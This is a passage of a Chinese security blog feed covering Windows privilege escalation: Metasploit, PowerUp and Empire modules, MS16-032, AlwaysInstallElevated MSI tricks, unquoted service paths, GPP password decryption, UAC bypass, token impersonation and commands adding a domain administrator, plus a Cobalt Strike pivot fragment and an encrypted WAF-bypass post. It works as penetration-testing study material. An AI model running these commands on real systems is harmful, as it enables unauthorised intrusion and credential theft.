<ip>命令断开它</p><ul><li><p><strong>中转listener(Reverse TCP Beacon)</strong><br><img src="https://img-blog.csdnimg.cn/dd8adf72287a4423a94c314a6332ec69.png" alt="在这里插入图片描述"><br>然后和上面差不多</p></li><li><p><strong>tcp beacon正向</strong><br>SMB Beacon，TCP Beacon 与 Cobalt Strike 中派生 payload 的大多数动作相兼容。除了一些 要求显式 stager 的用户驱动的攻击（比如：Attacks → Packages 、 Attacks → Web Drive-by ）<br>生成listener<br><img src="https://img-blog.csdnimg.cn/32f4b072d8fa4d7995f986e85d8b52e6.png" alt="在这里插入图片描述"><br>在中转机器的Beacon里使用connect [ip address] [port]命令进行正向连接，即可上线<img src="https://img-blog.csdnimg.cn/1a9ea1b53bf7497683fe74422ae01e0f.png" alt="在这里插入图片描述"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网穿透</tag>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网权限提升</title>
    <link href="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <url>/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在windows中，权限大概分为四种，分别是User,Administrator,System,TrustedInstaller。<br>其中前三种是我们接触的最多的。</p><ul><li><strong>纵向提权</strong><br>低权限角色获得高权限角色的权限。</li><li><strong>横向提权</strong><br>获取同级别角色的权限。</li></ul><p>常见的提权方法有系统内核溢出提权，数据库提权，错误的系统配置提权，组策略首选项提权，WEB中间件漏洞提权，DLL劫持提权，溢出高权限令牌提权，第三方软件&#x2F;服务提权等。</p><h2 id="补丁信息"><a href="#补丁信息" class="headerlink" title="补丁信息"></a>补丁信息</h2><ul><li><strong>手动查看</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systeminfo<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210524161935996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic qfe get Caption,Description,HotFixID,InstalledOn<br></code></pre></td></tr></table></figure><p>列出已安装补丁<br><img src="https://img-blog.csdnimg.cn/20210524162301631.png" alt="在这里插入图片描述"></p><p>如果目标机存在ms16-032(KB3139914）漏洞，不仅可以利用metasploit进行提权，还能够用invoke-ms16-032.ps1脚本进行提权。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">import-module Invoke-MS16-032.ps1<br>Invoke-MS16-032 -Application cmd.exe -Commandline <span class="hljs-string">&quot;/c net user test2 123.com /add&quot;</span><br></code></pre></td></tr></table></figure><ul><li><strong>利用Metasploit发现缺失补丁</strong><br>利用 post&#x2F;windows&#x2F;gather&#x2F;enum_patches 模块<br>可以根据漏洞编号快速找出系统中缺少的补丁。<br><img src="https://img-blog.csdnimg.cn/20210524172853322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>metasploit还内置了 local_exploit_suggester模块，这个模块用于快速识别系统中可能被利用的漏洞。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use post/multi/recon/local_exploit_suggester<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210524174600621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>Powershell中的Sherlock脚本</strong><br>用于快速查找可能用于本地提权的漏洞</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-Module .\Sherlock.ps1<br>Find-AllVulns<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210524175231551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>项目地址：<a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p><h2 id="Windows操作系统配置错误利用分析及防范"><a href="#Windows操作系统配置错误利用分析及防范" class="headerlink" title="Windows操作系统配置错误利用分析及防范"></a>Windows操作系统配置错误利用分析及防范</h2><p>在Windows系统中，攻击者通常会通过系统内核溢出漏洞来提权，但如果碰到无法通过内核溢出漏洞提权所在服务器权限的情况，就会利用系统中的配置错误来提权，Windows操作系统的常见配置错误包括管理员凭据配置错误，服务配置错误，故意消弱的安全措施，用户权限过高等。</p><ul><li><strong>PowerUP下的实战利用</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-Module .\PowerUp.ps1<br>Invoke-AllChecks<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210524181417745.png" alt="在这里插入图片描述"></p><ul><li><strong>Metasploit下的实战</strong><br>在metasploit中对应的模块是service_permissions，选择“AGGRESSIVE”选项，可以利用目标机器上每一个有缺陷的服务，该选项被禁用时，该模块在第一次提权成功后就会停止工作。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use windows/local/service_permissions<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210524190228309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>如果有成功利用的会自动反弹一个meterpreter(system权限)</p><ul><li><strong>注册表键 AlwayslnstallElevated</strong><br>注册表键AlwayslnstallElevated是一个策略设置项，Windows允许低权限用户以System权限运行安装文件。如果启用此策略选项，那么任何权限的用户都能以System来安装恶意的MSI文件。</li></ul><p>该漏洞产生的原因是用户开启了Windows Install特权安装功能。</p><p>利用powerup.ps1个Get-Registry AlwaysInstallElevated特权来检查注册表键是否被设置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-Module PowerUp.ps1<br>Get-RegistryAlwaysInstallElevated<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210524193008653.png" alt="在这里插入图片描述"><br>接下来，添加账号，运行Write-UserAddMSI模块，生成MSI文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Write-UserAddMSI<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021052419325166.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msiexec /q  /i UserAdd.msi<br></code></pre></td></tr></table></figure><p>这时，以普通权限运行UserAdd.msi，就会添加一个管理员账户。</p><h2 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h2><p>如果一个服务调用的可执行文件没有正确处理所引用的完整路径名，这个漏洞就会被攻击者用来上传任意可执行文件。也就是说，如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就存在漏洞。<br>该漏洞存在有如下两种可能</p><ol><li>如果路径与服务有关，就任意创建一个服务或者编译Service模板</li><li>.如果路径与可执行文件有关，就任意创建一个可执行文件。</li></ol><ul><li><p><strong>Trusted Service Paths 漏洞产生的原因</strong><br>因为windows服务通常都是以System权限运行的，所有系统在解析服务所对应的文件路径中的空格时，也会以系统权限进行。<br>比如，有一个文件路径”C:\Program Files\Some Folder\Service.exe”,对于该路径中的每一个空格，Windows都会尝试寻找与空格前面的名字相匹配的程序。操作系统会对文件路径中空格所有可能情况进行尝试，直到找到能匹配的程序。<br>会尝试：<br>1.C:\Program.exe<br>2.C:\Program Files\Some.exe<br>3.C:\Program Files\Some Folder\Service.exe<br>因此，如果一个被“适当”命名的可执行程序被上传到受影响的目录中，服务一旦重启，该程序就会以System权限运行（大多数情况下）</p></li><li><p><strong>实战</strong><br>首先检查目标机器中是否存在该漏洞，使用wmic查询命令：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic service get name,displayname,pathname,startmode | findstr /i <span class="hljs-string">&quot;Auto&quot;</span> | findstr /i /V <span class="hljs-string">&quot;C:\Windows\\&quot;</span> | findstr /i /V <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210524202011358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来检查对目标文件夹的写权限。在这里使用Windows的内置工具icacls，依次检测目录的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">icacls <span class="hljs-string">&quot;C:\Program Files (x86)\Common Files&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210525211917284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>要是其中目录后又”Everyone:(OI)(CI)(F)”字样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Everyone:用户对这个文件夹有完全控制权限。也就是说，所有用户具有修改这个文件夹的权限。<br>(M):修改<br>(f):修改<br>(CI):从属容器将继续访问控制项<br>(OI):从属文件将继续访问控制项<br>Everyone:(OI)(CI)(F)表示对该文件夹，用户有读写，删除其下文件，删除其子目录的权限<br></code></pre></td></tr></table></figure><p>确认此漏洞后，把要上传的程序重命名并放置在存漏洞且可写的目录下，执行如下命令，尝试重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sc stop service_name<br>sc start service_name<br></code></pre></td></tr></table></figure><p>也可以使用msf中的Windows Service Trusted Path Privilege Escalation模块进行渗透测试。该模块将可执行程序放到受影响的文件夹中，然后将受影响的服务重启。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">对trusted_service_path  模块进行参数设置<br></code></pre></td></tr></table></figure><p>命令执行后，会自动反弹shell，但shell会很快中断，这是因为当以进程在windows操作系统中启动后，必须与服务控制管理器进行通信，如果没有通信，服务控制管理器会认为出现了错误，进而终止这个进程。所以在终止载荷进程之前将它迁移到其他进程中（可使用”set AutoRunScript migrate -f”命令自动迁移进程)<br><img src="https://img-blog.csdnimg.cn/20210526115850943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>自动安装配置文件</strong><br>网络管理员在内网中给多态机器配置同一个环境时，通常不会逐台配置，而会使用脚本化批量部署的方式。在这一过程中，会使用安装配置文件。这些配置文件中包含所有的安装配置信息，其中的一些还有可能包含本地管理员账号和密码等信息。这些文件如下：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\sysprep.inf<br>c:\sysprep\sysprep.xml<br>c:\windows\system32\sysprep.inf<br>c:\windows\system32\sysprep\sysprep.xml<br>c:\unattend.xml<br>c:\Windows\Panther\Unattend.xml<br>c:\Windows\Panther\Unattended.xml<br>c:\Windows\Panther\Unattend\Unattended.xml<br>c:\Windows\Panther\Unattend\Unattend.xml<br>c:\windows\system32\sysprep\Unattend.xml<br>c:\windows\system32\sysprep\Panther\Unattend.xml<br></code></pre></td></tr></table></figure><p>可以直接输入如下命令搜索Unattend.xml文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> /b /s c:\Unattend.xml<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210527202913894.png" alt="在这里插入图片描述"></p><p>msf中也集成了该模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">post/windows/gather/enum_unattend<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210527210257122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>计划任务</strong><br>可以使用如下命令查看计算机的计划任务</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /query /fo LIST /v<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210527210614306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>AccessChk用于在Windows中进行一些系统或程序的高级查询，管理和故障排除工资。<br>下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk">https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk</a></p><p>执行如下命令，查看指定目录的权限配置情况。如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序。这样计划任务下次执行时，就会以高权限来运行恶意程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">accesschk.exe -dqv <span class="hljs-string">&quot;c:\Microsoft&quot;</span> -accepteula<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210527211318327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>常用的AccessChk命名<br>第一次运行时会弹出一个许可证协议对话框。这里，可以使用参数 &#x2F;accepteula 自动接受许可证协议</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">accesschk.exe /accepteula<br></code></pre></td></tr></table></figure><p>Accesschk可以自动的检查当我们使用一个特定的用户时，我们是否对Windows的某个服务有写的权限。当我们作为一个低权限用户，我们首先就想要看一下“Authenticated Users”组对这些服务的权限。</p><p>找出某个驱动器下所有权限配置有缺陷的文件夹路径</p><p>accesschk.exe -uwdqs Users c:\<br>accesschk.exe -uwdqs “Authenticated Users” c:\<br><img src="https://img-blog.csdnimg.cn/2021052721220467.png" alt="在这里插入图片描述"></p><p>找出某个驱动器下所有权限配置有缺陷的文件</p><p>accesschk.exe -uwqs Users c:*.*<br>accesschk.exe -uwqs “Authenticated Users” c:*.*</p><h2 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a>组策略首选项提权</h2><p>参考：<a href="https://www.cnblogs.com/Yang34/p/12492270.html">https://www.cnblogs.com/Yang34/p/12492270.html</a></p><p>文件路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Windows\SYSVOL\domain\Policies\&#123;8C4C36A7-7BA1-4F33-B2F5-9ADD814299F3&#125;\Machine\Preferences\Groups<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210529141335763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210529141442942.png" alt="在这里插入图片描述"><br>可以看到cpassword使用aes-256算法加密的。可以进行进行解密</p><p>在powersploit中提供了Get-GPPPassword.ps1脚本。将该脚本导入系统，获取组策略中的密码。<br><img src="https://img-blog.csdnimg.cn/20210529141905518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>msf中也集成了此功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use post/windows/gather/credentials/gpp<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210529142521212.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Empire查找cpassword，在Empire下执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">usemodule privesc/gpp<br></code></pre></td></tr></table></figure><ul><li><strong>绕UAC提权分析</strong><br>如果计算机的操作系统时windows vista或更高，在权限不够的情况下，访问系统磁盘的根目录，windows目录，Program Files目录，以及读，写系统登录数据库的程序等操作，都需要经过UAC（User Account Control,用户账户控制)的认证才能进行。<br>在msf中运行</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exploit/windows/local/bypassuac<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210529145440756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提权成功</p><ul><li><strong>RunAs模块</strong><br>使用</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exploit/windows/local/ask<br></code></pre></td></tr></table></figure><p>创建一个可执行文件，目标机器会运行一个发起提权的请求程序，提示用户是否继续运行，如果用户选择继续运行程序，就会返回一个高权限的shell。</p><p><img src="https://img-blog.csdnimg.cn/20210529150032475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210529150013701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击确定后再查看权限就是一个高权限了<br><img src="https://img-blog.csdnimg.cn/20210529150121205.png" alt="在这里插入图片描述"><br>要想使用RunAs模块进行提权，当前用户必须在管理员组中或者直到管理员的密码，对UAC的设置则没有要求，在使用RunAs模块时，需要使用EXE::Custom选项创建一个可执行文件（需进行免杀处理)</p><ul><li><strong>Empire 的bypassuac_wscript模块</strong><br>该模块的大致工作原理是，使用c:\windows\wscript.exe执行payload,即可绕过UAC，以管理员权限执行payload.该模块只适用于操作系统为windows7的机器，尚没有对应的补丁，部分杀毒软件会对该模块的运行进行提示。</li></ul><h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p>令牌是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的，获取令牌，就可以不提供密码或者其他凭据的情况下访问网络和系统资源。这些令牌存在于系统中（除非系统重启）</p><ul><li><strong>令牌窃取</strong><br>如果已经获取了目标机器的meterpreter shell  首先输入”use incognito”<br>然后输入 “list_tokens -u”<br><img src="https://img-blog.csdnimg.cn/20210529155130864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里有两种类型的令牌：一种是Delegation Tokens,也就是授权令牌，它支持交互式登录（例如，可以通过远程桌面登录访问），另一种Impersonation Tokens，也就是模拟令牌，它支持非交互式的会话。令牌数量其实取决于meterperter shell的访问级别。假设已经获得了一个系统管理员的授权令牌，如果攻击者可以伪造这个令牌，便可以拥有它的权限。<br>接下来，在incognito中调用impersonate_token假冒令牌<br>需要注意在输入主机名的时候需要输入两个反斜杠(\)<br><img src="https://img-blog.csdnimg.cn/20210529163449689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><p>令牌窃取成功</p><ul><li><strong>Rotten Potato本地提权分析</strong><br>如果目标系统中存在有效的令牌，可以通过Rotten Potato程序快速模拟用户令牌来实现权限提升。<br>首先输入”use incognito”命令，然后输入”list_tokens -u”命令，列出可用的令牌。<br>将rottenpotato.exe上传到目标机器中。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">execute -HC -f rottenpotato.exe <br>impersonate_token <span class="hljs-string">&quot;NT AUTHORITY\\SYSTEM&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210529190108893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210529190821111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>添加域管理员</strong><br>假设网络中设置了域管理进程。在meterpreter会话框中输入”ps”命令，查看系统进程。找到域管理进程，使用migrate命令迁移到该进程。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">net user sec 123456Bo /ad /domain    <span class="hljs-comment">#添加域用户</span><br>net group <span class="hljs-string">&quot;domain admins&quot;</span> sec /ad /domain    <span class="hljs-comment">#添加到域管理员组</span><br>net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain    <span class="hljs-comment">#查看域管理员组</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210529194459556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最开始的权限是不能创建账户的<br><img src="https://img-blog.csdnimg.cn/20210529195733667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210529195745269.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210529195924744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里没有域管理员进程就随便以一个高权限，思路是一样的。</p><ul><li><strong>无凭证条件下的权限获取分析</strong><br>Responder嗅探<br>参考文章：<a href="https://blog.csdn.net/nzjdsds/article/details/94314995">https://blog.csdn.net/nzjdsds/article/details/94314995</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>权限提升</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bypass waf笔记</title>
    <link href="/2022/06/15/Bypass-waf%E7%AC%94%E8%AE%B0/Bypass-waf%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/06/15/Bypass-waf%E7%AC%94%E8%AE%B0/Bypass-waf%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="e629a249cbb88c6e38d18c0383e31b69efba2f48b0ef94601f5f6ab4faf2e5bd">2713301b30d54682598aa2e6ff3844e09290e4dea22feb828b8b8162666121cf7c713bad1512ec4c543c1a39e7e62f5658440bc7b7707abd2122d86fbd542c7b4f7ad97d680ef41789d2ad498caa6a5069e8466ea6c18c770bce657576be67d5f2cfc8238a1049ae35837a292ba93d393a7b73e2961a4a809fa653ddbc010c69aea7040ec7487f75357cc78777eed825741d24291be9b12cea2d7e498085bb5f6af692bb29801cee5c91e7fdc8c913226a640e6031bfe3716ae303572401785cb9ae49dc0f4decf38a8dd03c60fb34873f17d2eab4e36c84818fa459efb482bae443043bb9d358611a3c867ba9d58c146f3bef6e492aa684f6405dab02deab80692f50e61c03069b1656872ba9a543fece03cf4f123a5ab5e835ae000211567d994facac388aa09c2611dd4a0e46d9831cebe3abfdca4f292336f0d157f53003978e00bad55d74ce7bcf45162fb6e098877deac8b56a77cf22b45c29174cd9a4d3856c5887bb5b2eb1f42aeff229e7bf628c33a22be05a5c48c5793202f969feaf39eefb69b84ea90a9b79ca03c3f60bc1cc6502db147afa51bbfb6e9c5cc7193854c338a498603a1819bb418ccbf01f6ca22606dad5059f79829583bfa9ac47569091024852f375c34755be9df9de58a9be8fe881ba26cad23566108dda19e5c695e28d6361046b5f7fa9d58e048b8819f903af4ea5c4c5e82c02ed30d50fedbe40a9c3377bde99ae836bdff1e1b687351886bec09f0ef3e99bf892a8373fe6fea3099ff8c6b2a51b1d864e643d32bdd1fc44a99001e5933786f58707b09781d8be08908370252b01e3606e3817df3a280fc3b3c3ec8e48d365541324cc7b8390fa27ecde8b2eedd2f7a127c7ad92193b5cbfa304520ed808856dfed0ff38eb35337933f09b0b47e3d681d7dbdd2815b626ed8b1bb56f1400c2a3db0b3ca6147b4da8267ec4963546662d7984ea6b4b22ca450eebdff7f23de12e2e8eca09b7668aea6d1255ed4150f953c281a2518a225c0c21ff7c73db989536aa17e7c18428389abbd4ea8852aecdda04588de05ab2ac8345fddcb7a7baed14110d578fa5c1aa34f292bbb622390f776907544e8307add555b4fe49d548c399349e02ff88166ab05a5d154738eca7e9b68eac89a5963448c91da0b75e06e048d44fd121e234190fa7024f23aa30b2db31be3df070ed64c7e6e3c5a21be9db20621c142ea9bbc5d6dfc0a1a02c46e591e24d8babecd85120b4be54aa8b4ed7737c58681ea9f87478809df7a4d9b5f88d3fa6466dbdd8e8474b2624fe312bfac6d85faa8243be7328d5625e552ef7515cc4709359932f1fba289c503c5053c2a49a3dfb5f65586dfba20b1037